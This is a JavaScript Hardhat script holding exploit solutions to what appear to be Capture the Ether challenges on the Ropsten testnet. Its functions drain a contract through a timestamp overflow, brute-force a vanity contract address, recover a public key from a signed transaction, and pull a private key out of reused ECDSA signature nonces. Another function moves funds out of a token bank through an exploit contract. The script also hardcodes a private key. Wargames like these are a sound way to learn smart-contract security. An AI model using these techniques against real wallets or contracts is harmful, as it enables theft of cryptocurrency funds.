// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers, network } = require("hardhat");
const hre = require("hardhat");
require("dotenv").config();

async function getPublicKey(txHash, rawTxHex = undefined) {
  const tx = await ethers.provider.getTransaction(txHash)

  // let txData
  // switch (tx.type) {
  //   case 0:
  //     txData = {
  //       gasPrice: tx.gasPrice,
  //       gasLimit: tx.gasLimit,
  //       value: tx.value,
  //       nonce: tx.nonce,
  //       data: tx.data,
  //       chainId: tx.chainId,
  //       to: tx.to
  //     };
  //     break;
  //   case 2:
  //     txData = {
  //       gasLimit: tx.gasLimit,
  //       value: tx.value,
  //       nonce: tx.nonce,
  //       data: tx.data,
  //       chainId: tx.chainId,
  //       to: tx.to,
  //       type: 2,
  //       maxFeePerGas: tx.maxFeePerGas,
  //       maxPriorityFeePerGas: tx.maxPriorityFeePerGas
  //     }
  //     break;
  //   default:
  //     throw "Unsupported tx type";
  // }

  const txData = {
    gasPrice: tx.gasPrice,
    gasLimit: tx.gasLimit,
    value: tx.value,
    nonce: tx.nonce,
    data: tx.data,
    chainId: tx.chainId,
    to: tx.to
  };

  const rsTx = await ethers.utils.resolveProperties(txData)

  let raw
  if (!rawTxHex) {
    raw = ethers.utils.serializeTransaction(rsTx) // returns RLP encoded tx    
  } else {
    raw = rawTxHex
  }

  const expandedSig = {
    r: tx.r,
    s: tx.s,
    v: tx.v
  }
  const signature = ethers.utils.joinSignature(expandedSig)

  const msgHash = ethers.utils.keccak256(raw) // as specified by ECDSA
  const msgBytes = ethers.utils.arrayify(msgHash) // create binary hash
  const recoveredPubKey = ethers.utils.recoverPublicKey(msgBytes, signature)

  return { recoveredPubKey, txData, msgHash }
}

async function FiftyYears() {
  const contractAddress = "0x179D13e3488001Fa3677CbCEa7ca1119a3B277a4"
  const balance = (await ethers.provider.getBalance(contractAddress)).toNumber()

  const ABI = ["function upsert(uint256 index, uint256 timestamp)", "function withdraw(uint256 index)"];
  const iface = new ethers.utils.Interface(ABI);
  const txData = [
    iface.encodeFunctionData("upsert", [0, ethers.constants.MaxUint256]),
    iface.encodeFunctionData("upsert", [0, 0]),
    iface.encodeFunctionData("withdraw", [0])
  ]

  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY)

  for (let ii = 0; ii < balance; ii++) {
    for (let jj = 0; jj < txData.length; jj++) {
      const tx = {
        from: wallet.address,
        data: txData[jj]
      }
      const signed = await wallet.signTransaction(tx);
      await ethers.provider.sendTransaction(signed);
    }
  }

  console.log("Done");
}

async function FuzzyIdentity_myImplementation() {
  require('draftlog').into(console)
  const update = console.draft("")

  let founded = false
  const allPrivateKeys = []
  let repeteaded = 0
  let trials = 0
  while (true) {
    const wallet = ethers.Wallet.createRandom()

    if (allPrivateKeys.includes(wallet.privateKey)) {
      console.log("Repeated private key!")
      repeteaded++
    }

    if (repeteaded === 10) {
      console.log("Too much repeated private keys!")
      break
    }

    allPrivateKeys.push(wallet.privateKey)
    trials++

    update(`Trials: ${trials}\nKeys:\n \tPrivate key: ${wallet.privateKey} \n\tAddress: ${wallet.address}\n`)

    for (let nonce = 0; nonce < 20; nonce++) {
      const futureAddress = ethers.utils.getContractAddress({
        from: wallet.address,
        nonce
      })

      if (futureAddress.toLowerCase().includes("badc0de")) {
        update(`Founded!\n\nOn trial: ${trials}\n\tNonce: ${nonce}\n\tPrivate key: ${wallet.privateKey}\n\tAccount address: ${wallet.address}\n\tContract address: ${futureAddress}\n\n`)
        // console.log("\n")
        // console.log("\n")
        // console.log("\n")
        // console.log("\n")
        // console.log("\n")

        // console.log(`Founded on trial ${trials}!\n`)
        // console.log(`\t Nonce: ${nonce}`)
        // console.log(`\t Private key: ${wallet.privateKey}`)
        // console.log(`\t Account address: ${wallet.address}`)
        // console.log(`\t Contract address: ${futureAddress}`)
        founded = true
        return
        break
      }
    }

    if (founded) {
      break
    }
  }
}

async function PublicKey() {

  const raw = "0xf87080843b9aca0083015f90946b477781b0e68031109f21887e6b5afeaaeb002b808c5468616e6b732c206d616e2129a0a5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7a05710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962"
  const txHash = "0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb"
  const contractAddress = "0x90C6743d7be778F896Bb28a9b2A61CB11F9bc684"
  const { recoveredPubKey, txData } = await getPublicKey(txHash)

  console.log(recoveredPubKey === "0x04613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4")

  const [account] = await ethers.getSigners()
  const ABI = ["function authenticate(bytes publicKey)", "function isComplete() view returns(bool)"];

  // const contract = new ethers.Contract(contractAddress, ABI, account)
  // const sentTx = await contract.authenticate(recoveredPubKey)
  // await sentTx.wait(1)

  // const isComplete = await contract.isComplete()
  // console.log(isComplete)

  const iface = new ethers.utils.Interface(ABI);
  const data = iface.encodeFunctionData("authenticate", ["0x613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4"])
  const newTxData = { ...txData, to: contractAddress, data, nonce: null }
  const sentTx = await account.sendTransaction(newTxData)
  await sentTx.wait(1)
}

async function AccountTakeOver() {
  // require('draftlog').into(console)
  // const update = console.draft("")
  let privKey = "614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269"

  if (!privKey) {
    const address = "0x6B477781b0e68031109f21887e6B5afEAaEB002b";
    const etherscanProvider = new ethers.providers.EtherscanProvider("ropsten");

    const history = await etherscanProvider.getHistory(address)

    for (let ii = 0; ii < history.length; ii++) {
      const tx1 = await ethers.provider.getTransaction(history[ii].hash)

      for (let jj = ii + 1; jj < history.length; jj++) {
        const tx2 = await ethers.provider.getTransaction(history[jj].hash)
        if (tx1.r === tx2.r) {
          console.log(`Founded!\n\ttx1Hash: ${history[ii].hash}\n\ttx2Hash: ${history[jj].hash}\n`)
          console.log(`r: ${tx1.r}`)
          console.log(`s1: ${tx1.s}`)
          let result = await getPublicKey(history[ii].hash)
          console.log(`z1: ${result.msgHash}`)
          console.log(`s2: ${tx2.s}`)
          result = await getPublicKey(history[jj].hash)
          console.log(`z2: ${result.msgHash}`)
          console.log(`p: 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141`)
          return
        }
      }
    }
  } else {
    const wallet = new ethers.Wallet(privKey, ethers.provider)
    if (!wallet.address === "0x6B477781b0e68031109f21887e6B5afEAaEB002b") {
      console.log("Wrong private key")
      return
    }

    const ABI = ["function authenticate()"];
    const iface = new ethers.utils.Interface(ABI);
    const data = iface.encodeFunctionData("authenticate", [])

    const txData = { to: "0xFE0eb183ADE8D836510d98Fed7eEE3ED34683404", data }
    const sentTx = await wallet.sendTransaction(txData)
    await sentTx.wait(1)
  }
}

async function TokenBank() {
  const [account] = await ethers.getSigners()

  const bankAddress = "0xaF9b81a0C15B4cCcdC50b9097B3D80eA57099565"
  const exploitAddress = "0x482f1d4aC223B8eD0ba1ef1ee0b812df952F03df"
  const tokenAddress = "0xDA5DDafF38C426CB285C59d9A00Cd342ca949199"
  const amount = ethers.BigNumber.from("500000000000000000000000")

  const bankABI = ["function withdraw(uint256 amount)"];
  const bankIface = new ethers.utils.Interface(bankABI);
  const bankData = bankIface.encodeFunctionData("withdraw", [amount])
  const bankTxData = { to: bankAddress, data: bankData, nonce: null }
  const bankSentTx = await account.sendTransaction(bankTxData)
  await bankSentTx.wait(1)
  console.log("First transaction done!")

  const tokenABI = ["function transfer(address to, uint256 value)"];
  const tokenIface = new ethers.utils.Interface(tokenABI);
  const tokenData = tokenIface.encodeFunctionData("transfer", [exploitAddress, amount])
  const tokenTxData = { to: tokenAddress, data: tokenData, nonce: null }
  const tokenSentTx = await account.sendTransaction(tokenTxData)
  await tokenSentTx.wait(1)

  console.log("All done!")
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
FuzzyIdentity_myImplementation().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
